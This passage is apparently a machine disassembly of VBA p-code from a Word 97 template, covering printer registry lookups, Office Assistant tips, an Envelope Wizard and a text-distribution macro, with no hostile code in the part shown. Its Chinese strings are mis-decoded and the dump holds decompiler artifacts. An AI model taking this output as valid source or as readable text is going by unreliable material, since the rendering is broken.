GetLocalPrinters())\n' Line #2357:\n' \tDim \n' \tVarDefn hr (As Long)\n' Line #2358:\n' \tDim \n' \tVarDefn hSubKey (As Long)\n' Line #2359:\n' Line #2360:\n' \tLd HKEY_LOCAL_MACHINE \n' \tLd strREG_LOCAL_PRINTERS \n' \tLd hSubKey \n' \tArgsLd RegOpenKey 0x0003 \n' \tSt hr \n' Line #2361:\n' \tLd hr \n' \tLd ERROR_SUCCESS \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tExitSub \n' \tEndIf \n' Line #2362:\n' Line #2363:\n' \tLd hSubKey \n' \tParen \n' \tArgsCall GetLocalPrinterNames 0x0001 \n' Line #2364:\n' Line #2365:\n' \tLd hSubKey \n' \tParen \n' \tArgsCall RegCloseKey 0x0001 \n' Line #2366:\n' Line #2367:\n' \tEndSub \n' Line #2368:\n' Line #2369:\n' \tFuncDefn (Sub GetLocalPrinterNames(hKey As Long))\n' Line #2370:\n' Line #2371:\n' \tDim \n' \tVarDefn lpPrinterName (As String)\n' \tVarDefn strPrinterName (As String)\n' Line #2372:\n' \tDim \n' \tVarDefn strPrinter (As String)\n' Line #2373:\n' \tDim \n' \tVarDefn cbPrinterName (As Long)\n' Line #2374:\n' \tDim \n' \tVarDefn dwPrinterIndex (As Long)\n' Line #2375:\n' \tDim \n' \tVarDefn lRet (As Long)\n' \tVarDefn iLenPrinterName (As Integer)\n' Line #2376:\n' Line #2377:\n' \tLitDI2 0x0100 \n' \tSt cbPrinterName \n' Line #2378:\n' \tLitDI2 0x0000 \n' \tSt dwPrinterIndex \n' Line #2379:\n' Line #2380:\n' \tOnError (Resume Next) \n' Line #2381:\n' Line #2382:\n' \tLd ERROR_SUCCESS \n' \tSt lRet \n' Line #2383:\n' \tLd lRet \n' \tLd ERROR_SUCCESS \n' \tEq \n' \tParen \n' \tWhile \n' Line #2384:\n' \tLd cbPrinterName \n' \tLitDI2 0x0000 \n' \tArgsLd String$$ 0x0002 \n' \tSt lpPrinterName \n' Line #2385:\n' Line #2386:\n' \tLd hKey \n' \tLd dwPrinterIndex \n' \tLd lpPrinterName \n' \tLd cbPrinterName \n' \tArgsLd RegEnumKey 0x0004 \n' \tSt lRet \n' Line #2387:\n' Line #2388:\n' \tLd lRet \n' \tLd ERROR_SUCCESS \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tGoTo LEndLocalPrinters \n' \tEndIf \n' Line #2389:\n' Line #2390:\n' \tLd lpPrinterName \n' \tLitDI2 0x0000 \n' \tArgsLd Chr$ 0x0001 \n' \tFnInStr \n' \tSt iLenPrinterName \n' Line #2391:\n' \tLd iLenPrinterName \n' \tLitDI2 0x0001 \n' \tGt \n' \tParen \n' \tIfBlock \n' \tQuoteRem 0x0026 0x0007 \"no name\"\n' Line #2392:\n' \tLd lpPrinterName \n' \tLd iLenPrinterName \n' \tLitDI2 0x0001 \n' \tSub \n' \tArgsLd LBound$ 0x0002 \n' \tSt strPrinter \n' Line #2393:\n' \tLitStr 0x0000 \"\"\n' \tSt strPrinterName \n' Line #2394:\n' \tLitStr 0x0000 \"\"\n' \tLitStr 0x0013 \"HKEY_LOCAL_MACHINE\\\"\n' \tLd strREG_LOCAL_PRINTERS \n' \tConcat \n' \tLd strPrinter \n' \tConcat \n' \tLitStr 0x0004 \"Name\"\n' \tLd System \n' \tArgsMemLd PrivateProfileString 0x0003 \n' \tSt strPrinterName \n' Line #2395:\n' Line #2396:\n' \tLd strPrinterName \n' \tFnLen \n' \tLitDI2 0x0000 \n' \tNe \n' \tIfBlock \n' \tQuoteRem 0x002D 0x001A \"if valid name, add to list\"\n' Line #2397:\n' \tLineCont 0x0004 09 00 14 00\n' \tLd iTotalNumPrinters \n' \tLitDI2 0x000A \n' \tMod \n' \tParen \n' \tLitDI2 0x0000 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tOptionBase \n' \tLd iTotalNumPrinters \n' \tLitDI2 0x000A \n' \tAdd \n' \tRedim (Preserve) rgstrPrinterNames 0x0001 (As Variant)\n' \tEndIf \n' Line #2398:\n' Line #2399:\n' \tLd strPrinterName \n' \tArgsLd UCase$ 0x0001 \n' \tLd iTotalNumPrinters \n' \tArgsSt rgstrPrinterNames 0x0001 \n' Line #2400:\n' Line #2401:\n' \tLd iTotalNumPrinters \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt iTotalNumPrinters \n' Line #2402:\n' \tEndIfBlock \n' Line #2403:\n' \tEndIfBlock \n' Line #2404:\n' Line #2405:\n' \tLd dwPrinterIndex \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt dwPrinterIndex \n' Line #2406:\n' \tWend \n' Line #2407:\n' Line #2408:\n' Line #2409:\n' \tLabel LEndLocalPrinters \n' Line #2410:\n' \tEndSub \n' Line #2411:\n' Line #2412:\n' \tQuoteRem 0x0000 0x0047 \"displays post wizard tip in an autodown balloon if Assistant is visible\"\n' Line #2413:\n' \tFuncDefn (Public Sub DisplayPostWizTip(strTip As String, fMsgBox As Boolean))\n' Line #2414:\n' Line #2415:\n' \tDim \n' \tVarDefn objTipBalloon (As Balloon)\n' Line #2416:\n' Line #2417:\n' \tOnError TipError \n' Line #2418:\n' \tLd fMsgBox \n' \tIfBlock \n' Line #2419:\n' \tLd Assistant \n' \tMemLd Visible \n' \tLitVarSpecial (False)\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tGoTo TipError \n' \tEndIf \n' Line #2420:\n' \tEndIfBlock \n' Line #2421:\n' \tSetStmt \n' \tLd Assistant \n' \tMemLd NewBalloon \n' \tSet objTipBalloon \n' Line #2422:\n' \tStartWithExpr \n' \tLd objTipBalloon \n' \tWith \n' Line #2423:\n' \tLd msoModeAutoDown \n' \tMemStWith Mode \n' Line #2424:\n' \tLd strWizName \n' \tMemStWith Heading \n' Line #2425:\n' \tLd msoButtonSetNone \n' \tMemStWith Button \n' Line #2426:\n' \tLd strTip \n' \tMemStWith Then \n' Line #2427:\n' \tEndWith \n' Line #2428:\n' \tLd objTipBalloon \n' \tArgsMemCall Show 0x0000 \n' Line #2429:\n' Line #2430:\n' \tLd Assistant \n' \tMemLd BalloonError \n' \tLd msoBalloonErrorNone \n' \tNe \n' \tIf \n' \tBoSImplicit \n' \tGoTo TipError \n' \tEndIf \n' Line #2431:\n' Line #2432:\n' \tLabel TipError \n' Line #2433:\n' \tLd Err \n' \tArgsMemCall Clear 0x0000 \n' Line #2434:\n' \tLd fMsgBox \n' \tIf \n' \tBoSImplicit \n' \tLd strTip \n' \tLd vbInformation \n' \tLd vbOKOnly \n' \tAdd \n' \tLd vbApplicationModal \n' \tAdd \n' \tLd strWizName \n' \tArgsCall MsgBox 0x0003 \n' \tEndIf \n' Line #2435:\n' \tEndSub \n' Line #2436:\n' Line #2437:\n' \tFuncDefn (Private Function FInvalidMainDoc(objMainDoc As , strDocName As String, id_FFFE As Boolean) As Boolean)\n' Line #2438:\n' \tOnError NoDoc \n' Line #2439:\n' \tSetStmt \n' \tLd strDocName \n' \tLd Application \n' \tArgsMemLd Documents 0x0001 \n' \tSet objMainDoc \n' Line #2440:\n' \tLitVarSpecial (False)\n' \tSt FInvalidMainDoc \n' Line #2441:\n' \tExitFunc \n' Line #2442:\n' \tLabel NoDoc \n' Line #2443:\n' \tLd strERR_NO_MAIN_DOC1 \n' \tLd strDocName \n' \tConcat \n' \tLd strERR_NO_MAIN_DOC2 \n' \tConcat \n' \tArgsCall DisplayErrorMsg 0x0001 \n' Line #2444:\n' \tLitVarSpecial (True)\n' \tSt FInvalidMainDoc \n' Line #2445:\n' \tEndFunc \n' Line #2446:\n' Line #2447:\n' \tFuncDefn (Public Sub DeleteCmdBar(strCmdBarName))\n' Line #2448:\n' \tOnError (Resume Next) \n' Line #2449:\n' \tLd strCmdBarName \n' \tLd Application \n' \tArgsMemLd CommandBars 0x0001 \n' \tArgsMemCall Delete 0x0000 \n' Line #2450:\n' \tLd Err \n' \tArgsMemCall Clear 0x0000 \n' Line #2451:\n' \tEndSub \n' Line #2452:\n' Line #2453:\n' Line #2454:\n' \tFuncDefn (Function GetCurFont(rgn As , id_FFFE As ) As <crash>)\n' Line #2455:\n' \tOnError LError \n' Line #2456:\n' \tLd rgn \n' \tMemLd Font \n' \tMemLd Size \n' \tLitDI4 0x967F 0x0098 \n' \tEq \n' \tParen \n' \tIfBlock \n' Line #2457:\n' \tLitDI2 0x0001 \n' \tLd rgn \n' \tArgsMemLd Characters 0x0001 \n' \tMemLd Font \n' \tMemLd Size \n' \tLitDI4 0x967F 0x0098 \n' \tEq \n' \tParen \n' \tIfBlock \n' Line #2458:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd rgn \n' \tArgsMemLd Paragraphs 0x0001 \n' \tMemLd Style \n' \tLd ActiveDocument \n' \tArgsMemLd Styles 0x0001 \n' \tMemLd Font \n' \tSet GetCurFont \n' Line #2459:\n' \tElseBlock \n' Line #2460:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd rgn \n' \tArgsMemLd Characters 0x0001 \n' \tMemLd Font \n' \tSet GetCurFont \n' Line #2461:\n' \tEndIfBlock \n' Line #2462:\n' \tElseBlock \n' Line #2463:\n' \tSetStmt \n' \tLd rgn \n' \tMemLd Font \n' \tSet GetCurFont \n' Line #2464:\n' \tEndIfBlock \n' Line #2465:\n' \tExitFunc \n' Line #2466:\n' \tLabel LError \n' Line #2467:\n' \tLd Err \n' \tMemLd Description \n' \tArgsCall MsgBox 0x0001 \n' Line #2468:\n' \tEndFunc \n' Line #2469:\n' Line #2470:\n' \tQuoteRem 0x0000 0x002E \"returns the value stored in registry key strId\"\n' Line #2471:\n' \tFuncDefn (Public Function StrFetchPref(strId As String, id_FFFE As String) As String)\n' Line #2472:\n' \tOnError LReturnNull \n' Line #2473:\n' Line #2474:\n' \tLitStr 0x0000 \"\"\n' \tLd strRegSettingsKey \n' \tLd strId \n' \tLd System \n' \tArgsMemLd PrivateProfileString 0x0003 \n' \tSt StrFetchPref \n' Line #2475:\n' \tExitFunc \n' Line #2476:\n' \tLabel LReturnNull \n' Line #2477:\n' \tLitStr 0x0000 \"\"\n' \tSt StrFetchPref \n' Line #2478:\n' \tEndFunc \n' Line #2479:\n' Line #2480:\n' \tQuoteRem 0x0000 0x0040 \"returns the string stored in strId. If empty, returns strDefault\"\n' Line #2481:\n' \tFuncDefn (Public Function StrRestorePref(strId As String, strDefault As String, id_FFFE As String) As String)\n' Line #2482:\n' \tDim \n' \tVarDefn strTemp (As String)\n' Line #2483:\n' Line #2484:\n' \tLd strId \n' \tArgsLd StrFetchPref 0x0001 \n' \tSt strTemp \n' Line #2485:\n' \tQuoteRem 0x0004 0x003D \" If length is 0, it wasn't in regsistry, so use default value\"\n' Line #2486:\n' \tLd strTemp \n' \tFnLen \n' \tLitDI2 0x0000 \n' \tEq \n' \tIfBlock \n' Line #2487:\n' \tLd strDefault \n' \tSt strTemp \n' Line #2488:\n' \tQuoteRem 0x0004 0x0036 \" \"~\" is a placeholder to allow returning empty strings\"\n' Line #2489:\n' \tLd strTemp \n' \tLitStr 0x0001 \"~\"\n' \tEq \n' \tElseIfBlock \n' Line #2490:\n' \tLitStr 0x0000 \"\"\n' \tSt strTemp \n' Line #2491:\n' \tEndIfBlock \n' Line #2492:\n' Line #2493:\n' \tLd strTemp \n' \tSt StrRestorePref \n' Line #2494:\n' \tEndFunc \n' Line #2495:\n' Line #2496:\n' \tQuoteRem 0x0000 0x0057 \" --------------------------------------------------------------------------------------\"\n' Line #2497:\n' \tQuoteRem 0x0000 0x0014 \" WORD 97 MINI-WIZARD\"\n' Line #2498:\n' \tQuoteRem 0x0000 0x001E \" Envelope Wizard Specific Code\"\n' Line #2499:\n' \tQuoteRem 0x0000 0x0057 \" --------------------------------------------------------------------------------------\"\n' Line #2500:\n' Line #2501:\n' \tOption  (Explicit)\n' Line #2502:\n' Line #2503:\n' \tQuoteRem 0x0000 0x0057 \" --------------------------------------------------------------------------------------\"\n' Line #2504:\n' \tQuoteRem 0x0000 0x000D \" DECLARATIONS\"\n' Line #2505:\n' \tQuoteRem 0x0000 0x0057 \" --------------------------------------------------------------------------------------\"\n' Line #2506:\n' Line #2507:\n' \tReparse 0x0025 \"Public Const strWIZ_NAME = \"\u00abH\u00ab\u00ca\u00ba\u00eb\u00c6F\"\"\n' Line #2508:\n' \tReparse 0x004F \"Public Const iBALLOON_OPTIONS = 2 ' Number of items in InitialBalloon (First=1)\"\n' Line #2509:\n' \tReparse 0x0036 \"Public Const strBALLOON_HEADING = \"\u00c5w\u00aa\u00ef\u00a8\u00cf\u00a5\u00ce\u00abH\u00ab\u00ca\u00ba\u00eb\u00c6F\u00a1C\"\"\n' Line #2510:\n' \tReparse 0x0065 \"Public Const strOPTION_ONE_ACCELERATOR = \"C\"   'This is the form accelerator for strInitialBalloon(0)\"\n' Line #2511:\n' \tReparse 0x0065 \"Public Const strOPTION_TWO_ACCELERATOR = \"e\"   'This is the form accelerator for strInitialBalloon(1)\"\n' Line #2512:\n' \tDim (Public) \n' \tOptionBase \n' \tLd iBALLOON_OPTIONS \n' \tVarDefn strInitialBalloon (As String)\n' Line #2513:\n' \tDim (Public) \n' \tOptionBase \n' \tLd iBALLOON_OPTIONS \n' \tVarDefn strHelpTip (As String)\n' Line #2514:\n' Line #2515:\n' \tFuncDefn (Public Sub InitWizardStrings())\n' Line #2516:\n' Line #2517:\n' \tQuoteRem 0x0000 0x004B \" NOTE: change constant  iBALLOON_OPTIONS if number of items in list changes\"\n' Line #2518:\n' \tQuoteRem 0x0004 0x001C \" Balloon / Form menu options\"\n' Line #2519:\n' \tLitStr 0x000A \"\u00ab\u00d8\u00a5\u00df\u00a4@\u00abH\u00ab\u00ca\"\n' \tLitDI2 0x0000 \n' \tArgsSt strInitialBalloon 0x0001 \n' Line #2520:\n' \tLitStr 0x0018 \"\u00ab\u00d8\u00a5\u00df\u00b6l\u00b1H\u00b2M\u00b3\u00e6\u00a4\u00a4\u00aa\u00ba\u00a9\u00d2\u00a6\u00b3\u00abH\u00ab\u00ca\"\n' \tLitDI2 0x0001 \n' \tArgsSt strInitialBalloon 0x0001 \n' Line #2521:\n' Line #2522:\n' \tQuoteRem 0x0004 0x0018 \" Assistant help messages\"\n' Line #2523:\n' \tLitStr 0x00A7 \"\u00bd\u00d0\u00c1\u00e4\u00a4J\u00abH\u00ab\u00ca\u00a4W\u00b1H\u00a5\u00f3\u00a4H\u00a4\u00ce\u00a6\u00ac\u00a5\u00f3\u00a4H\u00aa\u00ba\u00a6a\u00a7}\u00a1C\u00a9\u00ce\u00aa\u00cc\u00acO\u00b1q Microsoft Outlook \u00b3s\u00b5\u00b8\u00a4H\u00a9\u00ce Microsoft Exchange \u00ad\u00d3\u00a4H\u00b3q\u00b0T\u00bf\u00fd\u00a4\u00a4\u00ab\u00f6\u00a4@\u00a4U\u00a1u\u00b3q\u00b0T\u00bf\u00fd\u00a1v\u00ab\u00f6\u00b6s\u00a8\u00cf\u00a5\u00ce\u00a8\u00e4\u00a4\u00a4\u00aa\u00ba\u00a6W\u00b3\u00e6\u00a1C\u00b7\u00ed\u00b1z\u00c1\u00e4\u00a4J\u00a6a\u00a7}\u00a4\u00a7\u00ab\u00e1\u00bd\u00d0\u00ab\u00f6\u00a1u\u00a6C\u00a6L\u00a1v\u00a1C\"\n' \tLitDI2 0x0000 \n' \tArgsSt strHelpTip 0x0001 \n' Line #2524:\n' \tLitStr 0x0076 \"\u00b1z\u00a5i\u00a5H\u00a8\u00cf\u00a5\u00ce\u00a6X\u00a8\u00d6\u00a6C\u00a6L\u00aa\u00ba\u00a5\\\u00af\u00e0\u00a8\u00d3\u00ab\u00d8\u00a5\u00df\u00abH\u00ab\u00ca\u00a1C\u00b0\u00b2\u00a6p\u00b1z\u00bb\u00dd\u00adn\u00c0\u00b0\u00a6\u00a3\u00a1A\u00a8\u00ba\u00bb\u00f2\u00a6b\u00a6X\u00a8\u00d6\u00a6C\u00a6L\u00b9\u00ef\u00b8\u00dc\u00a4\u00e8\u00b6\u00f4\u00b3\u00bb\u00ba\u00dd\u00aa\u00ba\u00bb\u00a1\u00a9\u00fa\u00b1N\u00b7|\u00a4\u00de\u00be\u00c9\u00b1z\u00a7\u00b9\u00a6\u00a8\u00c1`\u00a6@\u00a6\u00b3\u00a4T\u00a8B\u00c6J\u00aa\u00ba\u00b5{\u00a7\u00c7\u00a1C\"\n' \tLitDI2 0x0001 \n' \tArgsSt strHelpTip 0x0001 \n' Line #2525:\n' Line #2526:\n' \tEndSub \n' \tQuoteRem 0x0009 0x0012 \" InitWizardStrings\"\n' Line #2527:\n' Line #2528:\n' \tFuncDefn (Public Function fnInitialBalloon(iBtn, id_FFFE As Variant))\n' Line #2529:\n' Line #2530:\n' \tQuoteRem 0x0004 0x001E \"On Error GoTo ErrorInitBalloon\"\n' Line #2531:\n' Line #2532:\n' \tLd iBtn \n' \tSelectCase \n' Line #2533:\n' \tLitDI2 0x0001 \n' \tCaseLt \n' \tCaseDone \n' \tQuoteRem 0x0014 0x0004 \"Exit\"\n' Line #2534:\n' \tLd wdDoNotSaveChanges \n' \tLd ActiveDocument \n' \tArgsMemCall Close 0x0001 \n' Line #2535:\n' \tLitDI2 0x0001 \n' \tCase \n' \tCaseDone \n' \tQuoteRem 0x000F 0x0019 \" Open the envelope dialog\"\n' Line #2536:\n' \tLd fAssistantAvailable \n' \tIf \n' \tBoSImplicit \n' \tArgsCall ShowAssistantTip 0x0000 \n' \tEndIf \n' Line #2537:\n' \tLd wdDialogToolsCreateEnvelope \n' \tLd Application \n' \tArgsMemLd Dialogs 0x0001 \n' \tArgsMemCall Show 0x0000 \n' Line #2538:\n' \tLd fAssistantAvailable \n' \tIf \n' \tBoSImplicit \n' \tLd objHelpTipBalloon \n' \tArgsMemCall Close 0x0000 \n' \tEndIf \n' Line #2539:\n' \tLitDI2 0x0002 \n' \tCase \n' \tCaseDone \n' \tQuoteRem 0x000F 0x0020 \" Start a Mail Merge to envelopes\"\n' Line #2540:\n' \tLd wdEnvelopes \n' \tLd ActiveDocument \n' \tMemLd MailMerge \n' \tMemSt MainDocumentType \n' Line #2541:\n' \tLd fAssistantAvailable \n' \tIf \n' \tBoSImplicit \n' \tArgsCall ShowAssistantTip 0x0000 \n' \tEndIf \n' Line #2542:\n' \tLd wdDialogMailMergeHelper \n' \tLd Application \n' \tArgsMemLd Dialogs 0x0001 \n' \tArgsMemCall Show 0x0000 \n' Line #2543:\n' \tLd fAssistantAvailable \n' \tIf \n' \tBoSImplicit \n' \tLd objHelpTipBalloon \n' \tArgsMemCall Close 0x0000 \n' \tEndIf \n' Line #2544:\n' \tEndSelect \n' Line #2545:\n' \tExitFunc \n' Line #2546:\n' Line #2547:\n' \tEndFunc \n' \tQuoteRem 0x000D 0x0011 \" fnInitialBalloon\"\n' Line #2548:\n' Line #2549:\n' \tQuoteRem 0x0000 0x001B \" End Envelope Wizard Module\"\n' Line #2550:\n' \tDim (Private Const) \n' \tLitStr 0x000A \"\u00a4\u00e5\u00a6r\u00a7\u00a1\u00b5\u00a5\u00a4\u00c0\"\n' \tVarDefn SZ_MACRONAME\n' Line #2551:\n' \tReparse 0x001C \"Global iPrevChars As Integer\"\n' Line #2552:\n' Line #2553:\n' \tFuncDefn (Sub Insert())\n' Line #2554:\n' \tDim \n' \tVarDefn n (As Integer)\n' Line #2555:\n' \tDim \n' \tVarDefn para (As Paragraph)\n' Line #2556:\n' \tDim \n' \tVarDefn fld (As Field)\n' Line #2557:\n' Line #2558:\n' \tOnError LError \n' Line #2559:\n' Line #2560:\n' \tLitVarSpecial (False)\n' \tLd Application \n' \tMemSt ScreenUpdating \n' Line #2561:\n' \tLd wdCursorWait \n' \tLd System \n' \tMemSt Cursor \n' Line #2562:\n' \tLitDI2 0x0002 \n' \tSt n \n' Line #2563:\n' \tStartWithExpr \n' \tLd Selection \n' \tWith \n' Line #2564:\n' \tLd Selection \n' \tMemLd Start \n' \tLd Selection \n' \tMemLd End \n' \tEq \n' \tParen \n' \tMemLdWith Then \n' \tLitDI2 0x0015 \n' \tArgsLd Chr$ 0x0001 \n' \tEq \n' \tParen \n' \tAnd \n' \tParen \n' \tIfBlock \n' Line #2565:\n' \tParamOmitted \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tArgsMemCallWith MoveRight 0x0003 \n' Line #2566:\n' \tEndIfBlock \n' Line #2567:\n' Line #2568:\n' \tStartForVariable \n' \tLd fld \n' \tEndForVariable \n' \tMemLdWith Fields \n' \tForEach \n' Line #2569:\n' \tLd fld \n' \tMemLd Code \n' \tSt a$ \n' Line #2570:\n' \tLd a$ \n' \tArgsLd FIsDistField 0x0001 \n' \tParen \n' \tIfBlock \n' Line #2571:\n' \tLitDI2 0x0001 \n' \tLd a$ \n' \tLitStr 0x0001 \",\"\n' \tFnInStr3 \n' \tSt iTop \n' Line #2572:\n' \tLitDI2 0x0001 \n' \tLd a$ \n' \tLitStr 0x0001 \")\"\n' \tFnInStr3 \n' \tLitDI2 0x0001 \n' \tSub \n' \tSt iEnd \n' Line #2573:\n' \tLd iEnd \n' \tLd iTop \n' \tSub \n' \tSt n \n' Line #2574:\n' \tLitVarSpecial (True)\n' \tLd dlgDist \n' \tMemLd ID_RESET \n' \tMemSt Enabled \n' Line #2575:\n' \tGoTo LSkip \n' Line #2576:\n' \tLitDI2 0x0001 \n' \tLd a$ \n' \tLitStr 0x0002 \"eq\"\n' \tFnInStr3 \n' \tLitDI2 0x0000 \n' \tNe \n' \tParen \n' \tElseIfBlock \n' Line #2577:\n' \tLitStr 0x000E \"\u00a6\u00b9\u00a6r\u00a6\u00ea\u00a5\u00bc\u00a7\u00a1\u00b5\u00a5\u00a4\u00c0\"\n' \tLd SZ_MACRONAME \n' \tParamNamed Title \n' \tArgsCall MsgBox 0x0002 \n' Line #2578:\n' \tGoTo LExit \n' \tBoS 0x0000 \n' Line #2579:\n' \tEndIfBlock \n' Line #2580:\n' \tStartForVariable \n' \tLd fld \n' \tEndForVariable \n' \tNextVar \n' Line #2581:\n' \tLitVarSpecial (False)\n' \tLd dlgDist \n' \tMemLd ID_RESET \n' \tMemSt Enabled \n' Line #2582:\n' \tLd Selection \n' \tMemLd Then \n' \tFnLen \n' \tLitDI2 0x0002 \n' \tLt \n' \tParen \n' \tIfBlock \n' Line #2583:\n' \tLitStr 0x002C \"\u00bd\u00d0\u00bf\u00ef\u00a8\u00fa\u00adn\u00a7\u00a1\u00b5\u00a5\u00a4\u00c0\u00aa\u00ba\u00a6r\u00a6\u00ea\u00a1A\u00a5B\u00a6r\u00a6\u00ea\u00adn\u00a6\u00b3\u00a8\u00e2\u00ad\u00d3\u00a6r\u00a5H\u00a4W\u00a1C\"\n' \tLd SZ_MACRONAME \n' \tParamNamed Title \n' \tArgsCall MsgBox 0x0002 \n' Line #2584:\n' \tGoTo LExit \n' Line #2585:\n' \tLineCont 0x0004 0C 00 10 00\n' \tLd Selection \n' \tMemLd Then \n' \tFnLen \n' \tLitDI2 0x0002 \n' \tEq \n' \tParen \n' \tLd Selection \n' \tMemLd Then \n' \tLitDI2 0x0001 \n' \tArgsLd Right 0x0002 \n' \tLitDI2 0x000D \n' \tArgsLd Chr$ 0x0001 \n' \tEq \n' \tParen \n' \tAnd \n' \tElseIfBlock \n' Line #2586:\n' \tLitStr 0x0044 \"\u00b4\u00ab\u00a6\u00e6\u00b2\u00c5\u00b8\u00b9\u00a1B\u00a9w\u00a6\u00ec\u00c2I\u00a4\u00ce\u00a5\\\u00af\u00e0\u00c5\u00dc\u00bc\u00c6\u00b3\u00a3\u00a4\u00a3\u00ba\u00e2\u00acO\u00a4@\u00ad\u00d3\u00a6r\u00a1A\u00bd\u00d0\u00ad\u00ab\u00b7s\u00bf\u00ef\u00be\u00dc\u00adn\u00a7\u00a1\u00b5\u00a5\u00a4\u00c0\u00aa\u00ba\u00a6r\u00a6\u00ea\u00a1C\"\n' \tLd SZ_MACRONAME \n' \tParamNamed Title \n' \tArgsCall MsgBox 0x0002 \n' Line #2587:\n' \tGoTo LExit \n' Line #2588:\n' \tLineCont 0x0004 0C 00 10 00\n' \tLd Selection \n' \tMemLd Then \n' \tFnLen \n' \tLitDI2 0x0002 \n' \tEq \n' \tParen \n' \tLd Selection \n' \tMemLd Then \n' \tLitDI2 0x0001 \n' \tArgsLd Right 0x0002 \n' \tLitDI2 0x0009 \n' \tArgsLd Chr$ 0x0001 \n' \tEq \n' \tParen \n' \tAnd \n' \tElseIfBlock \n' Line #2589:\n' \tLitStr 0x0044 \"\u00b4\u00ab\u00a6\u00e6\u00b2\u00c5\u00b8\u00b9\u00a1B\u00a9w\u00a6\u00ec\u00c2I\u00a4\u00ce\u00a5\\\u00af\u00e0\u00c5\u00dc\u00bc\u00c6\u00b3\u00a3\u00a4\u00a3\u00ba\u00e2\u00acO\u00a4@\u00ad\u00d3\u00a6r\u00a1A\u00bd\u00d0\u00ad\u00ab\u00b7s\u00bf\u00ef\u00be\u00dc\u00adn\u00a7\u00a1\u00b5\u00a5\u00a4\u00c0\u00aa\u00ba\u00a6r\u00a6\u00ea\u00a1C\"\n' \tLd SZ_MACRONAME \n' \tParamNamed Title \n' \tArgsCall MsgBox 0x0002 \n' Line #2590:\n' \tGoTo LExit \n' Line #2591:\n' \tEndIfBlock \n' Line #2592:\n' \tLitDI2 0x0001 \n' \tLd Selection \n' \tMemLd Then \n' \tLitDI2 0x000D \n' \tArgsLd Chr$ 0x0001 \n' \tFnInStr3 \n' \tLitDI2 0x0000 \n' \tNe \n' \tParen \n' \tIfBlock \n' Line #2593:\n' \tStartForVariable \n' \tLd para \n' \tEndForVariable \n' \tMemLdWith Paragraphs \n' \tForEach \n' Line #2594:\n' \tLd n \n' \tLd para \n' \tMemLd Range \n' \tMemLd Then \n' \tFnLen \n' \tLitDI2 0x0001 \n' \tSub \n' \tParen \n' \tLt \n' \tParen \n' \tIfBlock \n' Line #2595:\n' \tLd para \n' \tMemLd Range \n' \tMemLd Then \n' \tFnLen \n' \tLitDI2 0x0001 \n' \tSub \n' \tSt n \n' Line #2596:\n' \tEndIfBlock \n' Line #2597:\n' \tStartForVariable \n' \tLd para \n' \tEndForVariable \n' \tNextVar \n' Line #2598:\n' \tElseBlock \n' Line #2599:\n' \tLd Selection \n' \tMemLd Then \n' \tFnLen \n' \tSt n \n' Line #2600:\n' \tEndIfBlock \n' Line #2601:\n' \tLd n \n' \tLd iPrevChars \n' \tLt \n' \tParen \n' \tIfBlock \n' Line #2602:\n' \tLd iPrevChars \n' \tSt n \n' Line #2603:\n' \tEndIfBlock \n' Line #2604:\n' \tEndWith \n' Line #2605:\n' Line #2606:\n' \tLabel LSkip \n' Line #2607:\n' \tLd n \n' \tLitDI2 0x0020 \n' \tGt \n' \tParen \n' \tIfBlock \n' Line #2608:\n' \tLitDI2 0x0020 \n' \tSt n \n' Line #2609:\n' \tLd n \n' \tLitDI2 0x0001 \n' \tLt \n' \tParen \n' \tElseIfBlock \n' Line #2610:\n' \tLitDI2 0x0001 \n' \tSt n \n' Line #2611:\n' \tEndIfBlock \n' Line #2612:\n' \tLd n \n' \tLd dlgDist \n' \tMemLd IDCS_SIZE \n' \tMemSt Value \n' Line #2613:\n' \tLd n \n' \tLd dlgDist \n' \tMemLd IDCE_SIZE \n' \tMemSt Then \n' Line #2614:\n' \tLd fmIMEModeNoControl \n' \tLd dlgDist \n' \tMemLd IDCE_SIZE \n' \tMemSt IMEMode \n' Line #2615:\n' \tLd dlgDist \n' \tMemLd IDCE_SIZE \n' \tArgsMemCall SetFocus 0x0000 \n' Line #2616:\n' \tLitDI2 0x0000 \n' \tLd dlgDist \n' \tMemLd IDCE_SIZE \n' \tMemSt SelStart \n' Line #2617:\n' \tLitDI2 0x0063 \n' \tLd dlgDist \n' \tMemLd IDCE_SIZE \n' \tMemSt SelLength \n' Line #2618:\n' Line #2619:\n' \tLitVarSpecial (True)\n' \tLd Application \n' \tMemSt ScreenUpdating \n' Line #2620:\n' \tLd wdCursorNormal \n' \tLd System \n' \tMemSt Cursor \n' Line #2621:\n' Line #2622:\n' \tLd dlgDist \n' \tArgsMemCall Show 0x0000 \n' Line #2623:\n' Line #2624:\n' \tLabel LExit \n' Line #2625:\n' \tExitSub \n' Line #2626:\n' \tLabel LError \n' Line #2627:\n' \tLd Err \n' \tMemLd Description \n' \tLd SZ_MACRONAME \n' \tParamNamed Title \n' \tArgsCall MsgBox 0x0002 \n' Line #2628:\n' \tEndSub \n' Line #2629:\n' Line #2630:\n' \tFuncDefn (Sub Create(n As Integer))\n' Line #2631:\n' \tDim \n' \tVarDefn rgn (As Range)\n' Line #2632:\n' \tDim \n' \tVarDefn rgnTmp (As Range)\n' Line #2633:\n' \tDim \n' \tVarDefn rgnOrg (As Range)\n' Line #2634:\n' \tDim \n' \tVarDefn para (As Paragraph)\n' Line #2635:\n' \tDim \n' \tVarDefn cmdb (As CommandBar)\n' Line #2636:\n' Line #2637:\n' \tOnError LError \n' Line #2638:\n' \tLitVarSpecial (False)\n' \tLd Application \n' \tMemSt ScreenUpdating \n' Line #2639:\n' \tLd wdCursorWait \n' \tLd System \n' \tMemSt Cursor \n' Line #2640:\n' Line #2641:\n' \tStartWithExpr \n' \tLd Selection \n' \tWith \n' Line #2642:\n' \tSetStmt \n' \tMemLdWith Range \n' \tSet rgnOrg \n' Line #2643:\n' \tStartForVariable \n' \tLd para \n' \tEndForVariable \n' \tLd rgnOrg \n' \tMemLd Paragraphs \n' \tForEach \n' Line #2644:\n' \tLitDI2 0x0001 \n' \tLd rgnOrg \n' \tMemLd Then \n' \tLitDI2 0x000D \n' \tArgsLd Chr$ 0x0001 \n' \tFnInStr3 \n' \tLitDI2 